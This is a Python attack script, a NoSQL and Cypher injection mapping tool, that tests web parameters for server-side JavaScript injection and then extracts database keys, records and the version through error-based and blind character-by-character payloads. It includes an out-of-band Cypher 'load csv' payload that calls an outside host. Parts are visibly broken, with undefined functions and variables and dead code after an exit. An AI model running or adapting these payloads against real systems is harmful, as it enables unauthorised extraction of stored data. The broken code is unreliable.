#!/usr/bin/env python3.10

import argparse
import urllib.parse
import requests
import random
import secrets
import hashlib
import time
import html
import json
import sys
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

ascii_chars='0123456789abcdefghijklmnopqrstuvwxyz_ABCDEFGHIJKLMNOPQRSTUVWXYZ!"#$%&'+"'"+'()*+,-./:;<=>?@[\]^`{|}~ '
random_str = secrets.token_hex(16)
timeout_subdomain=hashlib.md5(random_str.encode()).hexdigest()

def perform_request(target_url, post_data=False, cookies_dict={}, connection_timeout=5):
    global timeout_subdomain
    proxies={}
    #proxies={'http':'http://localhost:8080', 'https': 'http://localhost:8080'}
    headers = {'Content-Type': 'application/x-www-form-urlencoded'} # Please modify manually if you are sending JSON :)
    try:
        if post_data:
            response = requests.post(target_url, data=post_data, cookies=cookies_dict, timeout=int(connection_timeout), proxies=proxies, headers=headers, verify=False)
        else:
            response = requests.get(target_url, cookies=cookies_dict, timeout=int(connection_timeout),proxies=proxies, verify=False)

        return response.text

    except requests.exceptions.Timeout:
        random_str = secrets.token_hex(16)
        timeout_subdomain=hashlib.md5(random_str.encode()).hexdigest()
        return False

def replace_last_and(input_str):
    global timeout_domain, timeout_subdomain
    last_and_index = input_str.rfind(' and ')
    if last_and_index != -1:
        return input_str[:last_and_index] + " then exists {load csv from 'http://"+timeout_subdomain+timeout_domain+"/' as csv_test} else false end and " + input_str[last_and_index+5:]
    else:
        return input_str

def nosql_inject(target_url, payload, post_data=False, cookies_dict={}, connection_timeout=5):
    # Check if '*' is in target_url
    if '*' in target_url:
        encoded_payload = urllib.parse.quote_plus(payload)
        target_url = target_url.replace('*', encoded_payload)
    else:
        # Check if '*' is in post_data
        if post_data and '*' in post_data:
            encoded_payload = urllib.parse.quote_plus(payload)
            post_data = post_data.replace('*', encoded_payload)
        else:
            print("Error: no '*' found in target URL or post data")
            return None
    
    ret=perform_request(target_url, post_data, cookies_dict, connection_timeout)
    return ret

def cypher_inject(target_url, payload, post_data=False, cookies_dict={}, connection_timeout=5, use_blind=True):
    global arbitary_timeout_sleep_value
    if not use_blind:
        payload=replace_last_and(payload)
        payload=payload.replace(" and ", " and case when ", 1)
    # Check if '*' is in target_url
    if '*' in target_url:
        encoded_payload = urllib.parse.quote_plus(payload)
        target_url = target_url.replace('*', encoded_payload)
    else:
        # Check if '*' is in post_data
        if post_data and '*' in post_data:
            encoded_payload = urllib.parse.quote_plus(payload)
            post_data = post_data.replace('*', encoded_payload)
        else:
            print("Error: no '*' found in target URL or post data")
            return None
    
    ret=perform_request(target_url, post_data, cookies_dict, connection_timeout)
    if not use_blind and not ret:
        time.sleep(arbitary_timeout_sleep_value)
    return ret

def get_error_injection_type(target_url, post_data, cookies_dict, connection_timeout):
    injection_character = "'" 
    injection_characters=[" ", '"', "'"]
    for injection_character in injection_characters:
        # Generate random values for the payload
        number1 = random.randint(10000,99999999)
        number2 = random.randint(10000,99999999)
        numbers_str = str(number1)+str(number2)

        # Prepare the payload for request
        error_payload = injection_character + ";throw new Error(String.concat(" + hex(number1) + "," + hex(number2) + "));" + injection_character + "1"

        # Try to inject the payloads target_url or post_data
        try:
            error_result = nosql_inject(target_url, error_payload, post_data, cookies_dict, connection_timeout)
        except Exception as e:
            print("Unable to perform nosql injection!!!")
            print("Error: "+str(e))
            sys.exit(-1)

        # Check if string concatanation of two numbers exists in output
        if numbers_str in error_result:
            return injection_character
    return False
def get_blind_injection_type(target_url, blind_string, post_data, cookies_dict, connection_timeout):
    
    injection_character = "'" 
    injection_characters=[" ", '"', "'"]
   
    for injection_character in injection_characters:
        # Generate random values for the payload
        number1 = random.randint(0, 10000)
        number2 = random.randint(0, 10000)

        # Prepare the payloads for the two requests
        true_payload = injection_character + " && " + injection_character + str(number1) + injection_character + "==" + injection_character + str(number1)
        false_payload = injection_character + " && " + injection_character + str(number1) + injection_character + "==" + injection_character + str(number2)

        # Try to inject the payloads using single quotes in target_url and post_data
        try:
            true_result = nosql_inject(target_url, true_payload, post_data, cookies_dict, connection_timeout)
            false_result = nosql_inject(target_url, false_payload, post_data, cookies_dict, connection_timeout)
        except Exception as e:
            print("Unable to perform nosql injection!!!")
            print("Error: "+str(e))
            sys.exit(-1)

        # Check if the blind string is present in the response to the first request but not in the response to the second request
        if blind_string and blind_string in true_result and blind_string not in false_result:
            return injection_character
        if not blind_string and  not true_result and false_result:
            return injection_character
    return False

def generate_cookies_dictionary(cookie_string):
    cookie_dict = {}
    if cookie_string:
        cookies = cookie_string.split(';')
        for cookie in cookies:
            name_value = cookie.strip().split('=', 1)
            if len(name_value) == 2:
                cookie_dict[name_value[0]] = name_value[1]
    return cookie_dict

def get_number_of_results(target_url, payload, blind_string, post_data, cookies_dict, connection_timeout):
    for number_of_results in range(1000): # arbitarily set max number or results to 1000 :)
        current_payload=payload.replace("%NUMBER_OF_RESULTS%",str(number_of_results))
        injection_result=cypher_inject(target_url, current_payload, post_data, cookies_dict, connection_timeout, blind_string)
        if (blind_string and injection_result and blind_string in injection_result) or (not blind_string and not injection_result):
            return number_of_results
    print("Unable to check number of results!!!")
    sys.exit(-1)

def get_number_of_labels(target_url, injection_type, blind_string, post_data, cookies_dict, connection_timeout):
    payload = injection_type + " and count {call db.labels() yield label return label} = %NUMBER_OF_RESULTS%" 
    payload+=" and "+injection_type+"1"+injection_type+"="+injection_type+"1"
    return get_number_of_results(target_url, payload, blind_string, post_data, cookies_dict, connection_timeout)

def get_size_of_result(target_url, payload, blind_string, post_data, cookies_dict, connection_timeout):
    for size_of_result in range(1000): # arbitarily set max size of result to 1000 :)
        current_payload=payload.replace("%SIZE_OF_RESULT%",str(size_of_result))
        injection_result=nosql_inject(target_url, current_payload, post_data, cookies_dict, connection_timeout)
        if (blind_string and injection_result and blind_string in injection_result) or not injection_result:
            return size_of_result
    print("Unable to check size of result!!!")
    sys.exit(-1)
    
def blind_get_number_of_keys(target_url, injection_character, blind_string, post_data, cookies_dict, connection_timeout):
    payload = injection_character + " && Object.keys(this).length == %SIZE_OF_RESULT% && " + injection_character + "1"
    return get_size_of_result(target_url, payload, blind_string, post_data, cookies_dict, connection_timeout) 

def blind_dump_keys(target_url, injection_character, blind_string, post_data, cookies_dict, connection_timeout):
    number_of_keys=blind_get_number_of_keys(target_url, injection_character, blind_string, post_data, cookies_dict, connection_timeout)
    keys_array=[]
    print(f"Number of keys: {number_of_keys}.")
    for key_index in range(number_of_keys):
        key_size_payload = injection_character + f" && Object.keys(this)[{key_index}].length == %SIZE_OF_RESULT% && " + injection_character + "1"
        key_size=get_size_of_result(target_url, key_size_payload, blind_string, post_data, cookies_dict, connection_timeout)
        print(f"Size of key number {key_index+1}/{number_of_keys}:{key_size}")
        key_dump_prefix=f"Value of key number {key_index+1}/{number_of_keys}: " 
        key_value_payload = injection_character + f" && Object.keys(this)[{key_index}].charCodeAt(%CHARACTER_NUMBER%) == %CURRENT_CHARACTER% && " + injection_character + "1"
        key_value=dump_string_value(target_url, key_dump_prefix, key_size, key_value_payload, blind_string, post_data, cookies_dict, connection_timeout)
        if len(keys_array) > key_index+1:
            keys_array[key_index+1].append(key_value)
        else:
            keys_array.append([key_value])
        print("\n")
    print("Keys:")
    dump_ascii_table(keys_array,True)
    return keys_array

def blind_dump_values_for_keys(target_url, injection_character, blind_string, keys_array, post_data, cookies_dict, connection_timeout):
    values_array=[]
    values_array.append(keys_array)
    last_id='0'
    current_id='0'
    # try to inject the payloads in target_url or post_data
    try:
        blind_size_payload = injection_character + ";if (this._id.toString().replace('ObjectId(\"','').replace('\")','') == '_CURRENT_ID_' && this._CURRENT_KEY_.toString().length == %SIZE_OF_RESULT%) { return true; } else { return false; };" + injection_character + "1"
        blind_value_payload = injection_character + ";if (this._id.toString().replace('ObjectId(\"','').replace('\")','') == '_CURRENT_ID_' && this._CURRENT_KEY_.toString().charCodeAt(%CHARACTER_NUMBER%) == %CURRENT_CHARACTER%) { return true; } else { return false; };" + injection_character + "1"
        blind_id_size_payload = injection_character + ";if (this._id.toString().replace('ObjectId(\"','').replace('\")','') > '_LAST_ID_' && this._id.toString().replace('ObjectId(\"','').replace('\")','').length == %SIZE_OF_RESULT%) { return true; } else { return false; };" + injection_character + "1"
        blind_id_value_payload = injection_character + ";if (this._id.toString().replace('ObjectId(\"','').replace('\")','') > '_LAST_ID_' && this._id.toString().replace('ObjectId(\"','').replace('\")','').startsWith('%DUMP_VALUE%') && this._id.toString().replace('ObjectId(\"','').replace('\")','').charCodeAt(%CHARACTER_NUMBER%) == %CURRENT_CHARACTER%) { return true; } else { return false; };" + injection_character + "1"
        while True:
            current_values=[]
            print(f"Checking if next id exists...")
            blind_next_id_test_payload = injection_character + ";if (this._id.toString().replace('ObjectId(\"','').replace('\")','') > '_CURRENT_ID_') { return true; } else { return false; };" + injection_character + "1"
            test_result = nosql_inject(target_url, blind_next_id_test_payload.replace("_CURRENT_ID_",current_id), post_data, cookies_dict, connection_timeout)
            if blind_string in test_result:
                print("Yes - dumping...")
            else:
                print("No - finishing.")
                break
            current_size_payload=blind_id_size_payload.replace("_LAST_ID_",last_id)
            current_value_size=get_size_of_result(target_url, current_size_payload, blind_string, post_data, cookies_dict, connection_timeout)
            print(f"Size of _id string:{current_value_size}")
            current_value_payload=blind_id_value_payload.replace("_LAST_ID_",last_id)
            current_value_dump_prefix=f"Value of _id string: " 
            current_value=dump_string_value(target_url, current_value_dump_prefix, current_value_size, current_value_payload, blind_string, post_data, cookies_dict, connection_timeout)
            print("\n")
            print(f"_id: {current_value}")
            current_id=current_value.replace('ObjectId("', '').replace('")', '')
            last_id=current_id
            for current_key in keys_array:
                current_size_payload=blind_size_payload.replace("_CURRENT_KEY_",current_key).replace('_CURRENT_ID_',current_id)
                current_value_size=get_size_of_result(target_url, current_size_payload, blind_string, post_data, cookies_dict, connection_timeout)
                print(f"Size of {current_key} string:{current_value_size}")
                current_value_payload=blind_value_payload.replace("_CURRENT_KEY_",current_key).replace('_CURRENT_ID_',current_id)
                current_value_dump_prefix=f"Value of {current_key} string: " 
                current_value=dump_string_value(target_url, current_value_dump_prefix, current_value_size, current_value_payload, blind_string, post_data, cookies_dict, connection_timeout)
                print("\n")
                print(f"{current_key}: {current_value}")
                current_values.append(current_value)
            values_array.append(current_values)
    except Exception as e:
        print("unable to perform nosql injection!!!")
        print("Error: "+str(e))
        sys.exit(-1)

    print("Data:")
    dump_ascii_table(values_array,True)
    return values_array 

def blind_get_db_version(target_url, injection_character, blind_string, post_data, cookies_dict, connection_timeout):
    db_version_size_payload = injection_character + " && version().length == %SIZE_OF_RESULT% && " + injection_character + "1"
    db_version_size=get_size_of_result(target_url, db_version_size_payload, blind_string, post_data, cookies_dict, connection_timeout)
    print(f"Size of db version string:{db_version_size}")
    db_version_dump_prefix=f"Value of db version string: " 
    db_version_value_payload = injection_character + f" && version().charCodeAt(%CHARACTER_NUMBER%) == %CURRENT_CHARACTER% && " + injection_character + "1"
    db_version_value=dump_string_value(target_url, db_version_dump_prefix, db_version_size, db_version_value_payload, blind_string, post_data, cookies_dict, connection_timeout)
    print("\n")
    print(f"Version: {db_version_value}")
    return db_version_value

def dump_string_value(target_url, dump_prefix, dump_size, payload, blind_string, post_data, cookies_dict, connection_timeout):
    print("\r"+(80*" ")+"\r"+dump_prefix,end='')
    dump_value=""
    for character_number in range(dump_size):
        for current_char in ascii_chars:
            if current_char == "'":
                current_char="\'"
            current_payload=payload.replace("%CHARACTER_NUMBER%",str(character_number))
            current_payload=current_payload.replace("%CURRENT_CHARACTER%",str(ord(current_char)))
            current_payload=current_payload.replace("%DUMP_VALUE%",dump_value)
            injection_result=cypher_inject(target_url, current_payload, post_data, cookies_dict, connection_timeout, blind_string)
            if (blind_string and injection_result and blind_string in injection_result) or not injection_result:
                dump_value+=current_char
                print("\r"+(80*" ")+f"\r"+dump_prefix+f"{dump_value}",end='')
                break
    return dump_value

def dump_labels(target_url, number_of_labels, injection_type, blind_string, post_data, cookies_dict, connection_timeout):
    global ascii_chars
    label_array=[]
    for label_index in range(number_of_labels):
        label_size=get_size_of_label(target_url, label_index, injection_type, blind_string, post_data, cookies_dict, connection_timeout)
        print(f"Size of label number {label_index+1}/{number_of_labels}: {label_size}")
        label_dump_prefix=f"Value of label number {label_index+1}/{number_of_labels}: " 
        print("\r"+(80*" ")+"\r"+label_dump_prefix,end='')
        payload = injection_type + " and exists {call db.labels() yield label with label skip " + str(label_index)
        payload+=" limit 1 where substring(label,%CHARACTER_NUMBER%,1) = '%CURRENT_CHARACTER%' return label}"
        payload+=" and "+injection_type+"1"+injection_type+"="+injection_type+"1"
        label_value=dump_string_value(target_url, label_dump_prefix, label_size, payload, blind_string, post_data, cookies_dict, connection_timeout)
        label_array.append(label_value)
        print("\n")
    print("Labels:")
    dump_ascii_table(label_array)
    return label_array

def get_number_of_properties(target_url, label_to_dump, injection_type, blind_string, post_data, cookies_dict, connection_timeout):
    #payload = injection_type + " and count {match(t:"+label_to_dump+") return keys(t)}"
    #payload+=" = %NUMBER_OF_RESULTS% and "+injection_type+"1"+injection_type+"="+injection_type+"1"
    payload = injection_type + " and count {match(t:"+label_to_dump+") call db.propertyKeys() yield propertyKey with propertyKey"
    payload+=" where not isEmpty(t[propertyKey]) with distinct propertyKey return propertyKey}"
    payload+=" = %NUMBER_OF_RESULTS% and "+injection_type+"1"+injection_type+"="+injection_type+"1"
    return get_number_of_results(target_url, payload, blind_string, post_data, cookies_dict, connection_timeout)

def get_size_of_property(target_url, label_to_dump, property_index, injection_type, blind_string, post_data, cookies_dict, connection_timeout):
    #payload = injection_type + " and exists {match(t:"+label_to_dump+") where size(keys(t)["+str(property_index)+"])"
    #payload+=" = %SIZE_OF_RESULT% return keys(t)} and "+injection_type+"1"+injection_type+"="+injection_type+"1"
    payload = injection_type + " and exists {match(t:"+label_to_dump+") call db.propertyKeys() yield propertyKey with propertyKey"
    payload+=" where not isEmpty(t[propertyKey]) with distinct propertyKey skip "+str(property_index)+" limit 1"
    payload+=" where size(propertyKey) = %SIZE_OF_RESULT% return propertyKey}"
    payload+=" and "+injection_type+"1"+injection_type+"="+injection_type+"1"
    return get_size_of_result(target_url, payload, blind_string, post_data, cookies_dict, connection_timeout) 


def dump_properties(target_url, label_to_dump, injection_type, blind_string, post_data, cookies_dict, connection_timeout):
    number_of_properties=get_number_of_properties(target_url, label_to_dump, injection_type, blind_string, post_data, cookies_dict, connection_timeout)
    print(f"Number of label '{label_to_dump}' properties: {number_of_properties}\n")
    label_properties_array=[label_to_dump]
    for property_index in range(number_of_properties):
        property_size=get_size_of_property(target_url, label_to_dump, property_index, injection_type, blind_string, post_data, cookies_dict, connection_timeout)
        print(f"Size of property number {property_index+1}/{number_of_properties}: {property_size}")
        property_dump_prefix=f"Value of property number {property_index+1}/{number_of_properties}: " 
        #payload = injection_type + " and exists {match(t:"+label_to_dump+") where substring(keys(t)["+str(property_index)+"],%CHARACTER_NUMBER%,1)"
        #payload+=" = '%CURRENT_CHARACTER%' return keys(t)} and "+injection_type+"1"+injection_type+"="+injection_type+"1"
        payload = injection_type + " and exists { match(t:"+label_to_dump+") call db.propertyKeys() yield propertyKey with propertyKey where not"
        payload+=" isEmpty(t[propertyKey]) with distinct propertyKey skip "+str(property_index)+" limit 1 where"
        payload+=" substring(propertyKey,%CHARACTER_NUMBER%,1)='%CURRENT_CHARACTER%' return propertyKey}"
        payload+=" and "+injection_type+"1"+injection_type+"="+injection_type+"1"
        property_value=dump_string_value(target_url, property_dump_prefix, property_size, payload, blind_string, post_data, cookies_dict, connection_timeout)
        label_properties_array.append(property_value)
        print("\n")
    print(f"Label: {label_to_dump}\n")
    print("Properties:")
    dump_ascii_table(label_properties_array,True)
    return label_properties_array

def error_get_db_version(target_url, error_injection_type, post_data, cookies_dict, connection_timeout):
    number1 = random.randint(10000,99999999)
    number2 = random.randint(10000,99999999)
    error_payload = error_injection_type + ";throw new Error(String.concat(" + hex(number1) + ",version()," + hex(number2) + "));" + error_injection_type + "1"

    # try to inject the payloads in target_url or post_data
    try:
        error_result = nosql_inject(target_url, error_payload, post_data, cookies_dict, connection_timeout)
        #print(error_result)

        version_string = error_result.split(str(number1), 1)[1].split(str(number2), 1)[0]

    except Exception as e:
        print("unable to perform nosql injection!!!")
        print(e.message)
        sys.exit(-1)

    print(f"Version: {version_string}")
    return version_string 

def error_dump_keys(target_url, error_injection_type, post_data, cookies_dict, connection_timeout):
    number1 = random.randint(10000,99999999)
    number2 = random.randint(10000,99999999)
    error_payload = error_injection_type + ";throw new Error(String.concat(" + hex(number1) + ",JSON.stringify(this)," + hex(number2) + "));" + error_injection_type + "1"

    # try to inject the payloads in target_url or post_data
    try:
        error_result = nosql_inject(target_url, error_payload, post_data, cookies_dict, connection_timeout)
        #print(error_result)

        error_json = error_result.split(str(number1), 1)[1].split(str(number2), 1)[0]
        decoded_error_json = html.unescape(error_json)

        #Parse JSON
        data = json.loads(decoded_error_json)

        #Extract all top-level keys
        keys_array = list(data.keys())

    except Exception as e:
        print("unable to perform nosql injection!!!")
        print(e.message)
        sys.exit(-1)

    print("Keys:")
    dump_ascii_table(keys_array,True)
    return keys_array 

def error_dump_values(target_url, requested_keys_array, error_injection_type, post_data, cookies_dict, connection_timeout):
    number1 = random.randint(10000,99999999)
    number2 = random.randint(10000,99999999)
    values_array=[]
    keys_array=[]
    last_id='0'
    error_payload = error_injection_type + ";if (this._id>'_LAST_ID_') {throw new Error(String.concat(" + hex(number1) + ",JSON.stringify(this)," + hex(number2) + "));};" + error_injection_type + "1"

    # try to inject the payloads in target_url or post_data
    try:
        while True:
            error_result = nosql_inject(target_url, error_payload.replace('_LAST_ID_',last_id), post_data, cookies_dict, connection_timeout)
            #print(error_result)

            if str(number1) not in error_result or str(number2) not in error_result:
                break
            error_json = error_result.split(str(number1), 1)[1].split(str(number2), 1)[0]
            decoded_error_json = html.unescape(error_json)

            #Parse JSON
            data = json.loads(decoded_error_json)
            
            #print(data)

            if not values_array:
                if requested_keys_array:
                    keys_array = requested_keys_array
                else:
                    #Extract all top-level keys
                    keys_array = list(data.keys())
                    keys_array.pop(0)

                values_array.append(keys_array)
             
            last_id=data['_id']['$oid']
            current_values=[data.get(k, None) for k in keys_array]
            values_array.append(current_values)
    except Exception as e:
        print("unable to perform nosql injection!!!")
        print(e.message)
        sys.exit(-1)

    print("Data:")
    dump_ascii_table(values_array,True)
    return values_array 

def dump_keys(target_url, label_to_dump, properties_list_to_dump, injection_type, blind_string, post_data, cookies_dict, connection_timeout):
    properties_array = properties_list_to_dump.split(',')
    label_keys_array=[properties_array]
    for property_to_dump in properties_array:
        number_of_keys=get_number_of_keys(target_url, label_to_dump, property_to_dump, injection_type, blind_string, post_data, cookies_dict, connection_timeout)
        print(f"Number of label '{label_to_dump}' and property '{property_to_dump}' keys: {number_of_keys}\n")
        #label_keys_array=[property_to_dump]
        for key_index in range(number_of_keys):
            key_size=get_size_of_key(target_url, label_to_dump, property_to_dump, key_index, injection_type, blind_string, post_data, cookies_dict, connection_timeout)
            print(f"Size of key number {key_index+1}/{number_of_keys} of property '{property_to_dump}': {key_size}")
            key_dump_prefix=f"Value of key number {key_index+1}/{number_of_keys}: " 
            payload = injection_type + " and exists {match(t:"+label_to_dump+") unwind keys(t) as key with key, t where key = '"+property_to_dump+"'"
            payload+=" with t,key skip "+str(key_index)+" limit 1 where substring(toString(t[key]),%CHARACTER_NUMBER%,1) = '%CURRENT_CHARACTER%'"
            payload+=" return t[key]} and "+injection_type+"1"+injection_type+"="+injection_type+"1"
            key_value=dump_string_value(target_url, key_dump_prefix, key_size, payload, blind_string, post_data, cookies_dict, connection_timeout)
            if len(label_keys_array) > key_index+1:
                label_keys_array[key_index+1].append(key_value)
            else:
                label_keys_array.append([key_value])

            print("\n")
    print(f"Label: {label_to_dump}\n")
    print(f"Property: {properties_list_to_dump}\n")
    print("Keys:")
    dump_ascii_table(label_keys_array,True)
    return label_keys_array


def dump_ascii_table(data, shouldPrintHeader=False):
    # determine the number of columns
    num_columns = len(data[0]) if isinstance(data[0], list) else 1

    # determine the maximum width of each column
    if num_columns == 1:
        column_widths = [max(len(str(data[i])) for i in range(len(data)))]
    else:
        column_widths = [max(len(str(data[i][j])) for i in range(len(data))) for j in range(num_columns)]

    # print the table header
    print('+' + '+'.join('-' * (width + 2) for width in column_widths) + '+')

    # print the table contents
    for row in data:
        if isinstance(row, list):
            print('| ' + ' | '.join(str(row[i]).ljust(column_widths[i]) for i in range(num_columns)) + ' |')
        else:
            print('| ' + str(row).ljust(column_widths[0]) + ' |')
        if shouldPrintHeader:
            print('+' + '+'.join('-' * (width + 2) for width in column_widths) + '+')
            shouldPrintHeader=False

    # print the table footer
    print('+' + '+'.join('-' * (width + 2) for width in column_widths) + '+')


print('\nNoSQL Mapping Tool by sectroyer v0.3\n')

try:
    parser = argparse.ArgumentParser(description='Tool for mapping cypher databases (for example neo4j)')
    parser.add_argument('-u', '--url', help='Target URL', required=True)
    parser.add_argument('-d', '--data', help='POST data', default=False)
    parser.add_argument('-c', '--cookie', help='Request cookie', default={})
    parser.add_argument('-s', '--string', help='Blind string')
    parser.add_argument('-t', '--timeout', help='Connection timeout', default=5)
    parser.add_argument('-V', '--dump-db-version', help='Dump database version', action='store_true')
    parser.add_argument('-P', '--properties', help='Dump properties for label')
    #parser.add_argument('-K', '--keys', help='Dump keys', action='store_true')
    # -K/--keys: optional value; if provided without value, becomes empty string ("")
    parser.add_argument(
        '-K', '--keys',
        nargs='?',            # optional argument value
        const='',             # value when flag is present but no value provided
        help='Dump keys (no value) or provide comma-separated keys (e.g., "key1,key2")'
    )
    parser.add_argument('-D', '--dump', help='Dump values', action='store_true')
    args = parser.parse_args()

    target_url = args.url
    post_data = args.data
    cookies_string = args.cookie
    blind_string = args.string
    connection_timeout = args.timeout

    cookies_dict=generate_cookies_dictionary(cookies_string)

    if "*" not in target_url and (not post_data or "*" not in post_data):
        print("Error: No '*' provided in url or data. Unable to continue...")
        sys.exit(-1)
    if target_url.count('*') > 1 or (post_data and post_data.count('*') > 1):
        print("More than one '*' provided in url or data. Unable to continue...")
        sys.exit(-1)

    should_dump_keys = False
    requested_keys_array = False  # will become list if specific keys were provided

    if args.keys is None:
        # -K/--keys not passed at all
        should_dump_keys = False
        requested_keys_array = False
    elif args.keys == '':
        # -K passed without a value: dump all keys
        should_dump_keys = True
        requested_keys_array = False
    else:
        # -K passed with a comma-separated value: extract selected keys
        should_dump_keys = False
        requested_keys_array = [k.strip() for k in args.keys.split(',') if k.strip()]

    error_injection_type=False
    blind_injection_type=False
    if not args.string:
        error_injection_type=get_error_injection_type(target_url, post_data, cookies_string, connection_timeout)
    if args.string:
        blind_injection_type=get_blind_injection_type(target_url, blind_string, post_data, cookies_dict, connection_timeout)
    if error_injection_type:
        print(f"Found Error Injection type: {error_injection_type}\n")
    elif blind_injection_type:
        print(f"Found Blind Injection type: {blind_injection_type}\n")
    else:
        print("Unable to find valid injection type...\n")
        sys.exit(-1)
    if error_injection_type:
        if should_dump_keys:
            print(f"Dumping keys.\n")
            error_dump_keys(target_url, error_injection_type, post_data, cookies_dict, connection_timeout)
        elif args.dump:
            print(f"Dumping values.\n")
            error_dump_values(target_url, requested_keys_array, error_injection_type, post_data, cookies_dict, connection_timeout)
        elif args.dump_db_version:
            print(f"Dumping database version.\n")
            error_get_db_version(target_url, error_injection_type, post_data, cookies_dict, connection_timeout)
    elif blind_injection_type:
        if should_dump_keys:
            print(f"Dumping keys.\n")
            blind_dump_keys(target_url, blind_injection_type, blind_string, post_data, cookies_dict, connection_timeout)
        elif args.dump:
            if not requested_keys_array:
                print(f"Dumping keys.\n")
                requested_keys_array=blind_dump_keys(target_url, blind_injection_type, blind_string, post_data, cookies_dict, connection_timeout)
            print(f"Dumping values.\n")
            blind_dump_values_for_keys(target_url, blind_injection_type, blind_string, requested_keys_array, post_data, cookies_dict, connection_timeout)
        elif args.dump_db_version:
            print(f"Dumping database version.\n")
            blind_get_db_version(target_url, blind_injection_type, blind_string, post_data, cookies_dict, connection_timeout)
    sys.exit(-1)
    if args.labels:
        print("Dumping labels....\n")
        number_of_labels = get_number_of_labels(target_url, injection_type, blind_string, post_data, cookies_dict, connection_timeout)
        print(f"Number of labels found: {number_of_labels}\n")
        dump_labels(target_url, number_of_labels, injection_type, blind_string, post_data, cookies_dict, connection_timeout)
    elif args.properties and args.keys:
        print(f"Dumping keys for property: {args.keys} and label: {args.properties}\n")
        dump_keys(target_url, args.properties, args.keys, injection_type, blind_string, post_data, cookies_dict, connection_timeout)
    elif args.properties:
        print(f"Dumping properties for label: {args.properties}...\n")
        dump_properties(target_url, args.properties, injection_type, blind_string, post_data, cookies_dict, connection_timeout)

    print('')
except SystemExit:
    print('')
    sys.exit()

# Your code here
